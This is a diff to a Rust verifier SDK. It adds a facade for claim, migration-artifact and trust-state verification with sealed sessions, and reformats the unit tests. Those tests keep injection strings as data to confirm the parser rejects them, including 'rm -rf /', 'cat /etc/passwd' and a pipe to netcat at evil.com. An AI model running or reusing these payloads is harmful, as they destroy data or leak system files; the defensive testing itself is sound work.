@@ -43,6 +43,10 @@
 //! - INV-CAPSULE-NO-PRIVILEGED-ACCESS: External replay requires no privileged internal access.
 //! - INV-CAPSULE-VERDICT-REPRODUCIBLE: Same capsule always produces the same verdict.
 
+use std::{collections::BTreeMap, fmt};
+
+use serde::{Deserialize, Serialize};
+
 pub mod bundle;
 pub mod capsule;
 pub mod counterfactual;
@@ -140,6 +144,361 @@ impl SdkEvent {
             detail: detail.into(),
         }
     }
+}
+
+/// Result verdict exposed by the stable verifier facade.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum VerificationVerdict {
+    Pass,
+    Fail,
+    Inconclusive,
+}
+
+impl From<capsule::CapsuleVerdict> for VerificationVerdict {
+    fn from(value: capsule::CapsuleVerdict) -> Self {
+        match value {
+            capsule::CapsuleVerdict::Pass => Self::Pass,
+            capsule::CapsuleVerdict::Fail => Self::Fail,
+            capsule::CapsuleVerdict::Inconclusive => Self::Inconclusive,
+        }
+    }
+}
+
+/// Stable facade operation names for result and session audit trails.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum VerificationOperation {
+    Claim,
+    MigrationArtifact,
+    TrustState,
+}
+
+/// Result of one assertion checked by the facade.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct AssertionResult {
+    pub assertion: String,
+    pub passed: bool,
+    pub detail: String,
+}
+
+/// Stable result type produced by the workspace verifier facade.
+///
+/// This is a structural-only external result: `verifier_signature` is a
+/// deterministic SDK hash over the result payload, not a replacement-critical
+/// detached verifier attestation.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+pub struct VerificationResult {
+    pub operation: VerificationOperation,
+    pub verdict: VerificationVerdict,
+    pub confidence_score: f64,
+    pub checked_assertions: Vec<AssertionResult>,
+    pub execution_timestamp: String,
+    pub verifier_identity: String,
+    pub artifact_binding_hash: String,
+    pub verifier_signature: String,
+    pub sdk_version: String,
+}
+
+/// Single append-only step in a verification session.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+pub struct SessionStep {
+    pub step_index: usize,
+    pub operation: VerificationOperation,
+    pub verdict: VerificationVerdict,
+    pub artifact_binding_hash: String,
+    pub timestamp: String,
+}
+
+/// Stateful multi-step verification workflow.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+pub struct VerificationSession {
+    pub session_id: String,
+    pub verifier_identity: String,
+    pub created_at: String,
+    pub steps: Vec<SessionStep>,
+    pub sealed: bool,
+    pub final_verdict: Option<VerificationVerdict>,
+}
+
+/// Error returned by the stable verifier facade.
+#[derive(Debug, Clone, PartialEq)]
+pub enum VerifierSdkError {
+    UnsupportedSdk(String),
+    Capsule(capsule::CapsuleError),
+    Bundle(bundle::BundleError),
+    EmptyTrustAnchor,
+    SessionSealed(String),
+    Json(String),
+}
+
+impl fmt::Display for VerifierSdkError {
+    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
+        match self {
+            Self::UnsupportedSdk(message) => write!(formatter, "{message}"),
+            Self::Capsule(source) => write!(formatter, "capsule verification failed: {source}"),
+            Self::Bundle(source) => write!(formatter, "bundle verification failed: {source}"),
+            Self::EmptyTrustAnchor => write!(formatter, "trust anchor is empty"),
+            Self::SessionSealed(session_id) => {
+                write!(formatter, "verification session {session_id} is sealed")
+            }
+            Self::Json(message) => write!(formatter, "verifier SDK JSON error: {message}"),
+        }
+    }
+}
+
+impl std::error::Error for VerifierSdkError {}
+
+impl From<capsule::CapsuleError> for VerifierSdkError {
+    fn from(source: capsule::CapsuleError) -> Self {
+        Self::Capsule(source)
+    }
+}
+
+impl From<bundle::BundleError> for VerifierSdkError {
+    fn from(source: bundle::BundleError) -> Self {
+        Self::Bundle(source)
+    }
+}
+
+const FACADE_TIMESTAMP: &str = "2026-02-21T00:00:00Z";
+
+/// Top-level facade for external verifier integrations.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct VerifierSdk {
+    pub verifier_identity: String,
+    pub sdk_version: String,
+    pub config: BTreeMap<String, String>,
+}
+
+impl VerifierSdk {
+    /// Create a new verifier SDK facade instance.
+    pub fn new(verifier_identity: impl Into<String>) -> Self {
+        let mut config = BTreeMap::new();
+        config.insert("schema_version".to_string(), SDK_VERSION.to_string());
+        config.insert(
+            "security_posture".to_string(),
+            STRUCTURAL_ONLY_SECURITY_POSTURE.to_string(),
+        );
+        Self {
+            verifier_identity: verifier_identity.into(),
+            sdk_version: SDK_VERSION.to_string(),
+            config,
+        }
+    }
+
+    /// Verify a claim capsule through the existing capsule replay verifier.
+    pub fn verify_claim(
+        &self,
+        claim: &capsule::ReplayCapsule,
+    ) -> Result<VerificationResult, VerifierSdkError> {
+        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
+        let replay = capsule::replay(claim, &self.verifier_identity)?;
+        let verdict = VerificationVerdict::from(replay.verdict);
+        let assertions = vec![
+            AssertionResult {
+                assertion: "capsule_replay_verified".to_string(),
+                passed: verdict == VerificationVerdict::Pass,
+                detail: replay.detail.clone(),
+            },
+            AssertionResult {
+                assertion: "capsule_signature_verified".to_string(),
+                passed: true,
+                detail: "capsule structural signature matched".to_string(),
+            },
+        ];
+        self.build_result(
+            VerificationOperation::Claim,
+            verdict,
+            assertions,
+            replay.actual_hash,
+        )
+    }
+
+    /// Verify a migration artifact as canonical replay bundle bytes.
+    pub fn verify_migration_artifact(
+        &self,
+        artifact: &[u8],
+    ) -> Result<VerificationResult, VerifierSdkError> {
+        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
+        let verified = bundle::verify(artifact)?;
+        let assertions = vec![
+            AssertionResult {
+                assertion: "replay_bundle_integrity_verified".to_string(),
+                passed: true,
+                detail: format!("bundle_id={}", verified.bundle_id),
+            },
+            AssertionResult {
+                assertion: "replay_bundle_canonical".to_string(),
+                passed: true,
+                detail: "canonical bundle bytes verified".to_string(),
+            },
+        ];
+        self.build_result(
+            VerificationOperation::MigrationArtifact,
+            VerificationVerdict::Pass,
+            assertions,
+            verified.integrity_hash,
+        )
+    }
+
+    /// Verify trust-state bundle bytes against an expected trust anchor hash.
+    pub fn verify_trust_state(
+        &self,
+        state: &[u8],
+        anchor_integrity_hash: &str,
+    ) -> Result<VerificationResult, VerifierSdkError> {
+        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
+        if anchor_integrity_hash.trim().is_empty() {
+            return Err(VerifierSdkError::EmptyTrustAnchor);
+        }
+
+        let verified = bundle::verify(state)?;
+        let anchor_matches = verified.integrity_hash == anchor_integrity_hash;
+        let assertions = vec![
+            AssertionResult {
+                assertion: "trust_state_bundle_integrity_verified".to_string(),
+                passed: true,
+                detail: format!("bundle_id={}", verified.bundle_id),
+            },
+            AssertionResult {
+                assertion: "trust_anchor_matches_integrity_hash".to_string(),
+                passed: anchor_matches,
+                detail: if anchor_matches {
+                    "trust anchor matched verified bundle integrity".to_string()
+                } else {
+                    format!(
+                        "expected={}, actual={}",
+                        anchor_integrity_hash, verified.integrity_hash
+                    )
+                },
+            },
+        ];
+        self.build_result(
+            VerificationOperation::TrustState,
+            if anchor_matches {
+                VerificationVerdict::Pass
+            } else {
+                VerificationVerdict::Fail
+            },
+            assertions,
+            verified.integrity_hash,
+        )
+    }
+
+    /// Create a new unsealed verification session.
+    pub fn create_session(&self, session_id: impl Into<String>) -> VerificationSession {
+        VerificationSession {
+            session_id: session_id.into(),
+            verifier_identity: self.verifier_identity.clone(),
+            created_at: FACADE_TIMESTAMP.to_string(),
+            steps: Vec::new(),
+            sealed: false,
+            final_verdict: None,
+        }
+    }
+
+    /// Append a verification result as the next session step.
+    pub fn record_session_step(
+        &self,
+        session: &mut VerificationSession,
+        result: &VerificationResult,
+    ) -> Result<SessionStep, VerifierSdkError> {
+        if session.sealed {
+            return Err(VerifierSdkError::SessionSealed(session.session_id.clone()));
+        }
+        let step = SessionStep {
+            step_index: session.steps.len(),
+            operation: result.operation.clone(),
+            verdict: result.verdict.clone(),
+            artifact_binding_hash: result.artifact_binding_hash.clone(),
+            timestamp: FACADE_TIMESTAMP.to_string(),
+        };
+        session.steps.push(step.clone());
+        Ok(step)
+    }
+
+    /// Seal a verification session and compute its final verdict.
+    pub fn seal_session(
+        &self,
+        session: &mut VerificationSession,
+    ) -> Result<VerificationVerdict, VerifierSdkError> {
+        if session.sealed {
+            return Err(VerifierSdkError::SessionSealed(session.session_id.clone()));
+        }
+        let verdict = if session.steps.is_empty() {
+            VerificationVerdict::Inconclusive
+        } else if session
+            .steps
+            .iter()
+            .all(|step| step.verdict == VerificationVerdict::Pass)
+        {
+            VerificationVerdict::Pass
+        } else {
+            VerificationVerdict::Fail
+        };
+        session.sealed = true;
+        session.final_verdict = Some(verdict.clone());
+        Ok(verdict)
+    }
+
+    fn build_result(
+        &self,
+        operation: VerificationOperation,
+        verdict: VerificationVerdict,
+        checked_assertions: Vec<AssertionResult>,
+        artifact_binding_hash: String,
+    ) -> Result<VerificationResult, VerifierSdkError> {
+        let confidence_score = match verdict {
+            VerificationVerdict::Pass => 1.0,
+            VerificationVerdict::Fail | VerificationVerdict::Inconclusive => 0.0,
+        };
+        let mut result = VerificationResult {
+            operation,
+            verdict,
+            confidence_score,
+            checked_assertions,
+            execution_timestamp: FACADE_TIMESTAMP.to_string(),
+            verifier_identity: self.verifier_identity.clone(),
+            artifact_binding_hash,
+            verifier_signature: String::new(),
+            sdk_version: self.sdk_version.clone(),
+        };
+        result.verifier_signature = facade_result_signature(&result)?;
+        Ok(result)
+    }
+}
+
+/// Create a top-level SDK facade instance.
+pub fn create_verifier_sdk(verifier_identity: impl Into<String>) -> VerifierSdk {
+    VerifierSdk::new(verifier_identity)
+}
+
+fn facade_result_signature(result: &VerificationResult) -> Result<String, VerifierSdkError> {
+    #[derive(Serialize)]
+    struct SignatureView<'a> {
+        operation: &'a VerificationOperation,
+        verdict: &'a VerificationVerdict,
+        confidence_score: f64,
+        checked_assertions: &'a [AssertionResult],
+        execution_timestamp: &'a str,
+        verifier_identity: &'a str,
+        artifact_binding_hash: &'a str,
+        sdk_version: &'a str,
+    }
+
+    let payload = serde_json::to_vec(&SignatureView {
+        operation: &result.operation,
+        verdict: &result.verdict,
+        confidence_score: result.confidence_score,
+        checked_assertions: &result.checked_assertions,
+        execution_timestamp: &result.execution_timestamp,
+        verifier_identity: &result.verifier_identity,
+        artifact_binding_hash: &result.artifact_binding_hash,
+        sdk_version: &result.sdk_version,
+    })
+    .map_err(|source| VerifierSdkError::Json(source.to_string()))?;
+    Ok(bundle::hash(&payload))
 }
 
 #[cfg(test)]
@@ -265,16 +624,16 @@ mod tests {
     #[test]
     fn negative_check_sdk_version_with_malformed_version_strings_rejects() {
         let invalid_versions = vec![
-            "v1.0",                    // Missing vsdk prefix
-            "vsdk-v",                  // Missing version number
-            "vsdk-v1",                 // Missing patch version
-            "vsdk-v1.",                // Incomplete version
-            "vsdk-v1.0.0",             // Too many version parts
-            "VSDK-V1.0",               // Wrong case
-            "vsdk-v1.0-beta",          // Pre-release suffix
-            "vsdk-v1.0+build",         // Build metadata
-            "vsdk-v01.0",              // Leading zeros
-            "vsdk-v-1.0",              // Negative version
+            "v1.0",            // Missing vsdk prefix
+            "vsdk-v",          // Missing version number
+            "vsdk-v1",         // Missing patch version
+            "vsdk-v1.",        // Incomplete version
+            "vsdk-v1.0.0",     // Too many version parts
+            "VSDK-V1.0",       // Wrong case
+            "vsdk-v1.0-beta",  // Pre-release suffix
+            "vsdk-v1.0+build", // Build metadata
+            "vsdk-v01.0",      // Leading zeros
+            "vsdk-v-1.0",      // Negative version
         ];
 
         for version in invalid_versions {
@@ -289,13 +648,13 @@ mod tests {
     #[test]
     fn negative_check_sdk_version_with_unicode_and_control_characters_rejects() {
         let problematic_versions = vec![
-            "vsdk-v1\0.0",             // Null byte
-            "vsdk-v1\x01.0",           // Control character
-            "vsdk-v1🚀.0",             // Emoji
-            "vsdk-v1\u{FFFF}.0",       // Max BMP character
-            "vsdk-v1.0\n",             // Trailing newline
-            "\u{200B}vsdk-v1.0",       // Zero-width space prefix
-            "vsdk-v1.0\u{00A0}",       // Non-breaking space suffix
+            "vsdk-v1\0.0",       // Null byte
+            "vsdk-v1\x01.0",     // Control character
+            "vsdk-v1🚀.0",       // Emoji
+            "vsdk-v1\u{FFFF}.0", // Max BMP character
+            "vsdk-v1.0\n",       // Trailing newline
+            "\u{200B}vsdk-v1.0", // Zero-width space prefix
+            "vsdk-v1.0\u{00A0}", // Non-breaking space suffix
         ];
 
         for version in problematic_versions {
@@ -323,12 +682,16 @@ mod tests {
         // Should complete quickly despite long input (within 100ms)
         assert!(
             duration < std::time::Duration::from_millis(100),
-            "Version check took too long: {:?}", duration
+            "Version check took too long: {:?}",
+            duration
         );
 
         // Error message should truncate or handle long input safely
         let err = result.unwrap_err();
-        assert!(err.len() < 200_000, "Error message should not be excessively long");
+        assert!(
+            err.len() < 200_000,
+            "Error message should not be excessively long"
+        );
     }
 
     #[test]
@@ -388,12 +751,12 @@ mod tests {
     fn negative_version_check_error_message_formatting_with_special_characters() {
         // Test that error message formatting handles special characters safely
         let versions_with_format_specifiers = vec![
-            "vsdk-%s",                     // Printf format specifier
-            "vsdk-{placeholder}",          // Rust format placeholder
-            "vsdk-v1.0%",                  // Percent character
-            "vsdk-v1.0\\n",                // Escape sequences
-            "vsdk-v1.0\"quoted\"",         // Quote characters
-            "vsdk-v1.0'apostrophe'",       // Apostrophe
+            "vsdk-%s",               // Printf format specifier
+            "vsdk-{placeholder}",    // Rust format placeholder
+            "vsdk-v1.0%",            // Percent character
+            "vsdk-v1.0\\n",          // Escape sequences
+            "vsdk-v1.0\"quoted\"",   // Quote characters
+            "vsdk-v1.0'apostrophe'", // Apostrophe
         ];
 
         for version in versions_with_format_specifiers {
@@ -408,8 +771,8 @@ mod tests {
             assert!(err.contains("supported=vsdk-v1.0"));
 
             // Error message should not interpret format specifiers
-            assert!(!err.contains("(null)"));  // Common printf error
-            assert!(!err.contains("Error"));   // Shouldn't expand placeholders
+            assert!(!err.contains("(null)")); // Common printf error
+            assert!(!err.contains("Error")); // Shouldn't expand placeholders
         }
     }
 
@@ -430,28 +793,54 @@ mod tests {
         assert!(STRUCTURAL_ONLY_RULE_ID.contains("VERIFIER_SHORTCUT_GUARD"));
 
         // Event codes should follow expected patterns
-        let event_codes = [CAPSULE_CREATED, CAPSULE_SIGNED, CAPSULE_REPLAY_START,
-                          CAPSULE_VERDICT_REPRODUCED, SDK_VERSION_CHECK];
+        let event_codes = [
+            CAPSULE_CREATED,
+            CAPSULE_SIGNED,
+            CAPSULE_REPLAY_START,
+            CAPSULE_VERDICT_REPRODUCED,
+            SDK_VERSION_CHECK,
+        ];
         for code in &event_codes {
             assert!(!code.is_empty());
             assert!(code.is_ascii(), "Event code should be ASCII: {}", code);
         }
 
         // Error codes should follow ERR_ prefix pattern
-        let error_codes = [ERR_CAPSULE_SIGNATURE_INVALID, ERR_CAPSULE_SCHEMA_MISMATCH,
-                          ERR_CAPSULE_REPLAY_DIVERGED, ERR_CAPSULE_VERDICT_MISMATCH,
-                          ERR_SDK_VERSION_UNSUPPORTED, ERR_CAPSULE_ACCESS_DENIED];
+        let error_codes = [
+            ERR_CAPSULE_SIGNATURE_INVALID,
+            ERR_CAPSULE_SCHEMA_MISMATCH,
+            ERR_CAPSULE_REPLAY_DIVERGED,
+            ERR_CAPSULE_VERDICT_MISMATCH,
+            ERR_SDK_VERSION_UNSUPPORTED,
+            ERR_CAPSULE_ACCESS_DENIED,
+        ];
         for code in &error_codes {
-            assert!(code.starts_with("ERR_"), "Error code should start with ERR_: {}", code);
+            assert!(
+                code.starts_with("ERR_"),
+                "Error code should start with ERR_: {}",
+                code
+            );
             assert!(code.is_ascii(), "Error code should be ASCII: {}", code);
         }
 
         // Invariant codes should follow INV- prefix pattern
-        let invariant_codes = [INV_CAPSULE_STABLE_SCHEMA, INV_CAPSULE_VERSIONED_API,
-                              INV_CAPSULE_NO_PRIVILEGED_ACCESS, INV_CAPSULE_VERDICT_REPRODUCIBLE];
+        let invariant_codes = [
+            INV_CAPSULE_STABLE_SCHEMA,
+            INV_CAPSULE_VERSIONED_API,
+            INV_CAPSULE_NO_PRIVILEGED_ACCESS,
+            INV_CAPSULE_VERDICT_REPRODUCIBLE,
+        ];
         for code in &invariant_codes {
-            assert!(code.starts_with("INV-"), "Invariant code should start with INV-: {}", code);
-            assert!(code.contains("CAPSULE"), "Invariant should relate to capsules: {}", code);
+            assert!(
+                code.starts_with("INV-"),
+                "Invariant code should start with INV-: {}",
+                code
+            );
+            assert!(
+                code.contains("CAPSULE"),
+                "Invariant should relate to capsules: {}",
+                code
+            );
         }
     }
 
@@ -487,32 +876,40 @@ mod tests {
     fn negative_sdk_version_check_with_integer_overflow_patterns() {
         // Test version strings that could cause integer overflow in parsing
         let overflow_versions = vec![
-            "vsdk-v18446744073709551615.0".to_string(),    // u64::MAX
-            "vsdk-v999999999999999999.0".to_string(),      // Large number
-            "vsdk-v1.18446744073709551615".to_string(),    // u64::MAX as minor
-            "vsdk-v1.999999999999999999".to_string(),      // Large minor number
-            "vsdk-v0.4294967295".to_string(),              // u32::MAX as minor
-            format!("vsdk-v{}.0", i64::MAX),  // i64::MAX
-            format!("vsdk-v{}.0", u128::MAX), // u128::MAX (would be huge)
+            "vsdk-v18446744073709551615.0".to_string(), // u64::MAX
+            "vsdk-v999999999999999999.0".to_string(),   // Large number
+            "vsdk-v1.18446744073709551615".to_string(), // u64::MAX as minor
+            "vsdk-v1.999999999999999999".to_string(),   // Large minor number
+            "vsdk-v0.4294967295".to_string(),           // u32::MAX as minor
+            format!("vsdk-v{}.0", i64::MAX),            // i64::MAX
+            format!("vsdk-v{}.0", u128::MAX),           // u128::MAX (would be huge)
         ];
 
         for version in overflow_versions {
             let result = check_sdk_version(&version);
-            assert!(result.is_err(), "Version with potential overflow should be rejected: {}", version);
+            assert!(
+                result.is_err(),
+                "Version with potential overflow should be rejected: {}",
+                version
+            );
 
             let err = result.unwrap_err();
             assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
 
             // Error message should be safely bounded even with large numbers
-            assert!(err.len() < 1000, "Error message should not be excessively long for version: {}", version);
+            assert!(
+                err.len() < 1000,
+                "Error message should not be excessively long for version: {}",
+                version
+            );
         }
     }
 
     #[test]
     fn negative_sdk_event_concurrent_access_stress_test() {
         // Test SdkEvent under concurrent access patterns (single-threaded simulation)
-        use std::rc::Rc;
         use std::cell::RefCell;
+        use std::rc::Rc;
 
         let shared_detail = Rc::new(RefCell::new(String::from("concurrent_test")));
         let mut events = Vec::new();
@@ -556,17 +953,21 @@ mod tests {
     fn negative_version_check_with_null_byte_and_binary_data() {
         // Test version strings containing null bytes and binary data
         let binary_versions = vec![
-            "vsdk-v1\x00.0".to_string(),                           // Null byte in middle
-            "\x00vsdk-v1.0".to_string(),                           // Null byte at start
-            "vsdk-v1.0\x00".to_string(),                           // Null byte at end
-            "vsdk-v1\u{FF}\u{FE}.0".to_string(),                   // Binary data (BOM-like)
-            "vsdk-v1.\u{80}\u{81}\u{82}".to_string(),              // High-bit bytes
+            "vsdk-v1\x00.0".to_string(),              // Null byte in middle
+            "\x00vsdk-v1.0".to_string(),              // Null byte at start
+            "vsdk-v1.0\x00".to_string(),              // Null byte at end
+            "vsdk-v1\u{FF}\u{FE}.0".to_string(),      // Binary data (BOM-like)
+            "vsdk-v1.\u{80}\u{81}\u{82}".to_string(), // High-bit bytes
             String::from_utf8_lossy(&[118, 115, 100, 107, 45, 118, 49, 0, 46, 48]).into_owned(), // Null in UTF-8
         ];
 
         for version in binary_versions {
             let result = check_sdk_version(&version);
-            assert!(result.is_err(), "Binary data version should be rejected: {:?}", version.as_bytes());
+            assert!(
+                result.is_err(),
+                "Binary data version should be rejected: {:?}",
+                version.as_bytes()
+            );
 
             let err = result.unwrap_err();
             assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
@@ -581,16 +982,16 @@ mod tests {
     fn negative_sdk_event_detail_with_extreme_unicode_edge_cases() {
         // Test SdkEvent with Unicode edge cases that could cause issues
         let unicode_edge_cases = vec![
-            "\u{0}",                                    // Null character as Unicode
-            "\u{FFFF}",                                 // Maximum BMP character
-            "\u{10FFFF}",                               // Maximum Unicode codepoint
-            r#"\uD800"#,                                // Raw string with high surrogate escape
-            r#"\uDFFF"#,                                // Raw string with low surrogate escape
-            "\u{1F4A9}\u{200D}\u{1F525}",              // Complex emoji sequence
-            "\u{0301}\u{0302}\u{0303}",                // Combining characters only
-            "a\u{0300}\u{0301}\u{0302}\u{0303}b",      // Heavily accented character
-            "\u{202E}reverse\u{202D}text",             // BiDi override characters
-            "\u{FEFF}BOM\u{FEFF}marker",               // Byte order marks
+            "\u{0}",                              // Null character as Unicode
+            "\u{FFFF}",                           // Maximum BMP character
+            "\u{10FFFF}",                         // Maximum Unicode codepoint
+            r#"\uD800"#,                          // Raw string with high surrogate escape
+            r#"\uDFFF"#,                          // Raw string with low surrogate escape
+            "\u{1F4A9}\u{200D}\u{1F525}",         // Complex emoji sequence
+            "\u{0301}\u{0302}\u{0303}",           // Combining characters only
+            "a\u{0300}\u{0301}\u{0302}\u{0303}b", // Heavily accented character
+            "\u{202E}reverse\u{202D}text",        // BiDi override characters
+            "\u{FEFF}BOM\u{FEFF}marker",          // Byte order marks
         ];
 
         for (idx, detail) in unicode_edge_cases.into_iter().enumerate() {
@@ -611,7 +1012,11 @@ mod tests {
             // Converting to bytes and back should be stable
             let detail_bytes = event.detail.as_bytes();
             let roundtrip = String::from_utf8_lossy(detail_bytes);
-            assert_eq!(roundtrip, detail, "Unicode roundtrip failed for case {}: {:?}", idx, detail);
+            assert_eq!(
+                roundtrip, detail,
+                "Unicode roundtrip failed for case {}: {:?}",
+                idx, detail
+            );
         }
     }
 
@@ -619,24 +1024,28 @@ mod tests {
     fn negative_version_string_with_path_traversal_injection_attempts() {
         // Test version strings that look like path traversal or injection attempts
         let injection_attempts = vec![
-            "../vsdk-v1.0",                            // Path traversal up
-            "vsdk-v1.0/../",                           // Path traversal suffix
-            "./vsdk-v1.0",                             // Current directory prefix
-            "vsdk-v1.0/../../etc/passwd",              // Deep path traversal
-            "file:///vsdk-v1.0",                       // File URI scheme
-            "http://evil.com/vsdk-v1.0",               // HTTP URL
-            "$(echo vsdk-v1.0)",                       // Command injection
-            "`cat /etc/passwd`",                       // Backtick injection
-            "${USER}vsdk-v1.0",                        // Variable expansion
-            "vsdk-v1.0; rm -rf /",                     // Command chaining
-            "vsdk-v1.0 && echo pwned",                 // Command AND
-            "vsdk-v1.0 | nc evil.com 9999",           // Pipe to netcat
-            "vsdk-v1.0\nrm -rf /",                     // Newline injection
+            "../vsdk-v1.0",                 // Path traversal up
+            "vsdk-v1.0/../",                // Path traversal suffix
+            "./vsdk-v1.0",                  // Current directory prefix
+            "vsdk-v1.0/../../etc/passwd",   // Deep path traversal
+            "file:///vsdk-v1.0",            // File URI scheme
+            "http://evil.com/vsdk-v1.0",    // HTTP URL
+            "$(echo vsdk-v1.0)",            // Command injection
+            "`cat /etc/passwd`",            // Backtick injection
+            "${USER}vsdk-v1.0",             // Variable expansion
+            "vsdk-v1.0; rm -rf /",          // Command chaining
+            "vsdk-v1.0 && echo pwned",      // Command AND
+            "vsdk-v1.0 | nc evil.com 9999", // Pipe to netcat
+            "vsdk-v1.0\nrm -rf /",          // Newline injection
         ];
 
         for injection in injection_attempts {
             let result = check_sdk_version(injection);
-            assert!(result.is_err(), "Injection attempt should be rejected: {}", injection);
+            assert!(
+                result.is_err(),
+                "Injection attempt should be rejected: {}",
+                injection
+            );
 
             let err = result.unwrap_err();
             assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
@@ -655,16 +1064,16 @@ mod tests {
     fn negative_sdk_event_with_format_string_attack_patterns() {
         // Test SdkEvent with format string attack patterns
         let format_attacks = vec![
-            "%s%s%s%s%s%s",                             // Multiple format specs
-            "%x%x%x%x%x%x%x",                           // Hex dump attempts
-            "%08x.%08x.%08x.%08x",                      // Stack reading pattern
-            "{}{}{}{}{}{}",                             // Rust format braces
-            "{0}{1}{2}{3}",                             // Indexed format
-            "%n%n%n%n%n",                               // Write attempts (C)
-            "\\x41\\x42\\x43",                         // Hex escape sequences
-            "\\u0041\\u0042\\u0043",                    // Unicode escapes
-            "\\\\n\\\\t\\\\r",                         // Escape sequence attempts
-            "%p%p%p%p%p",                               // Pointer dumping
+            "%s%s%s%s%s%s",          // Multiple format specs
+            "%x%x%x%x%x%x%x",        // Hex dump attempts
+            "%08x.%08x.%08x.%08x",   // Stack reading pattern
+            "{}{}{}{}{}{}",          // Rust format braces
+            "{0}{1}{2}{3}",          // Indexed format
+            "%n%n%n%n%n",            // Write attempts (C)
+            "\\x41\\x42\\x43",       // Hex escape sequences
+            "\\u0041\\u0042\\u0043", // Unicode escapes
+            "\\\\n\\\\t\\\\r",       // Escape sequence attempts
+            "%p%p%p%p%p",            // Pointer dumping
         ];
 
         for pattern in format_attacks {
@@ -757,9 +1166,9 @@ mod tests {
         assert!(check_sdk_version("vsdk-v1.0").is_ok()); // Exact match
         assert!(check_sdk_version("vsdk-v1.1").is_err()); // Close but wrong
         assert!(check_sdk_version("vsdk-v0.9").is_err()); // Close but wrong
-        assert!(check_sdk_version("vsdk-v").is_err());    // Missing version
-        assert!(check_sdk_version("vsdk-").is_err());     // Missing v prefix
-        assert!(check_sdk_version("sdk-v1.0").is_err());  // Missing vs prefix
+        assert!(check_sdk_version("vsdk-v").is_err()); // Missing version
+        assert!(check_sdk_version("vsdk-").is_err()); // Missing v prefix
+        assert!(check_sdk_version("sdk-v1.0").is_err()); // Missing vs prefix
 
         // Test boundary around supported version
         let slightly_off_versions = vec![
@@ -772,7 +1181,11 @@ mod tests {
         ];
 
         for version in slightly_off_versions {
-            assert!(check_sdk_version(version).is_err(), "Slightly malformed version should be rejected: {:?}", version);
+            assert!(
+                check_sdk_version(version).is_err(),
+                "Slightly malformed version should be rejected: {:?}",
+                version
+            );
         }
     }
 
@@ -783,14 +1196,20 @@ mod tests {
         // Extreme: Unicode bidirectional override attacks in event details
         let bidi_attack_patterns = vec![
             // Right-to-left override sequences that could manipulate display
-            format!("normal{}evil{}", "\u{202E}", "\u{202D}"),     // RLE + PDF
+            format!("normal{}evil{}", "\u{202E}", "\u{202D}"), // RLE + PDF
             format!("safe{}hidden{}visible", "\u{2066}", "\u{2069}"), // FSI + PDI
-            format!("text{}rtl{}end", "\u{200F}", "\u{200E}"),     // RLM + LRM
-            format!("{}arabic{}", "\u{061C}", "\u{202C}"),         // ALM + PDF
+            format!("text{}rtl{}end", "\u{200F}", "\u{200E}"), // RLM + LRM
+            format!("{}arabic{}", "\u{061C}", "\u{202C}"),     // ALM + PDF
             // Nested bidirectional overrides
-            format!("{}a{}b{}c{}", "\u{202E}", "\u{2066}", "\u{2069}", "\u{202D}"),
+            format!(
+                "{}a{}b{}c{}",
+                "\u{202E}", "\u{2066}", "\u{2069}", "\u{202D}"
+            ),
             // Mixed with zero-width characters
-            format!("{}{}attack{}{}", "\u{202E}", "\u{200B}", "\u{200C}", "\u{202D}"),
+            format!(
+                "{}{}attack{}{}",
+                "\u{202E}", "\u{200B}", "\u{200C}", "\u{202D}"
+            ),
         ];
 
         for (_i, malicious_detail) in bidi_attack_patterns.iter().enumerate() {
@@ -806,18 +1225,23 @@ mod tests {
             assert!(debug_output.contains("CAPSULE_CREATED"));
 
             // Should contain BiDi control characters (not be stripped)
-            assert!(event.detail.contains('\u{202E}') ||
-                   event.detail.contains('\u{2066}') ||
-                   event.detail.contains('\u{200F}') ||
-                   event.detail.contains('\u{061C}'),
-                   "BiDi control characters should be preserved in detail");
+            assert!(
+                event.detail.contains('\u{202E}')
+                    || event.detail.contains('\u{2066}')
+                    || event.detail.contains('\u{200F}')
+                    || event.detail.contains('\u{061C}'),
+                "BiDi control characters should be preserved in detail"
+            );
 
             // Clone should preserve exact BiDi sequence
             let cloned = event.clone();
             assert_eq!(cloned.detail.as_bytes(), malicious_detail.as_bytes());
 
             // Length calculations should handle BiDi correctly
-            assert_eq!(cloned.detail.chars().count(), malicious_detail.chars().count());
+            assert_eq!(
+                cloned.detail.chars().count(),
+                malicious_detail.chars().count()
+            );
         }
 
         // Test version checking with BiDi injection
@@ -841,9 +1265,11 @@ mod tests {
 
         for i in 0..collision_candidates {
             // Create event details with patterns likely to collide
-            let collision_detail = format!("collision_test_{}_{:016x}",
-                                          i,
-                                          i as u64 * 0x9e3779b97f4a7c15); // Fibonacci hashing constant
+            let collision_detail = format!(
+                "collision_test_{}_{:016x}",
+                i,
+                i as u64 * 0x9e3779b97f4a7c15
+            ); // Fibonacci hashing constant
 
             let event = SdkEvent::new(CAPSULE_VERDICT_REPRODUCED, collision_detail.clone());
 
@@ -852,11 +1278,13 @@ mod tests {
             assert_eq!(event.detail, collision_detail);
 
             // Track hash distribution (simplified hash for testing)
-            let simple_hash = collision_detail.bytes().fold(0u32, |acc, b| {
-                acc.wrapping_mul(31).wrapping_add(b as u32)
-            });
+            let simple_hash = collision_detail
+                .bytes()
+                .fold(0u32, |acc, b| acc.wrapping_mul(31).wrapping_add(b as u32));
 
-            *hash_collision_tracker.entry(simple_hash % 1000).or_insert(0) += 1;
+            *hash_collision_tracker
+                .entry(simple_hash % 1000)
+                .or_insert(0) += 1;
 
             // Test cloning under collision scenarios
             let cloned = event.clone();
@@ -873,12 +1301,19 @@ mod tests {
 
         // Analyze collision distribution to ensure reasonable spread
